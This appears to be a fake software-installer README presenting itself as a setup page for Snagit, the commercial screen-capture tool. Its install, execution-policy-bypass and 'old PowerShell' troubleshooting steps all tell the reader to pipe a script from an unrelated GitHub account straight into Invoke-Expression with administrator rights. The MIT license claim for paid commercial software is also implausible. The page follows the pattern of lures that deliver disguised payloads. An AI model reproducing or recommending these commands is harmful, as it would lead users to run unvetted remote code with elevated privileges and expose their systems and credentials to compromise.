# Snagit Screen Capture Setup
the professional screen capture and recording tool with a built-in image editor, smart scrolling capture, and one-click sharing for teams and content creators.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for global hotkey and system overlay installation.
- Downloads Snagit installer silently with all capture profile modules.
- Installs Snagit with the Editor, screen recorder, and template library.
- Configures default hotkeys and opens the capture toolbar on the desktop edge.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~400 MB free disk space

## Troubleshooting

**Scrolling capture stops before reaching the bottom of a web page**

Slow down the scroll speed in Capture > All-in-one > Scrolling settings for more reliable capture.

**Snagit Editor crashes when applying stamps or callout elements**

Reset Editor preferences from Help > Reset Application to factory defaults, then restart Snagit.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.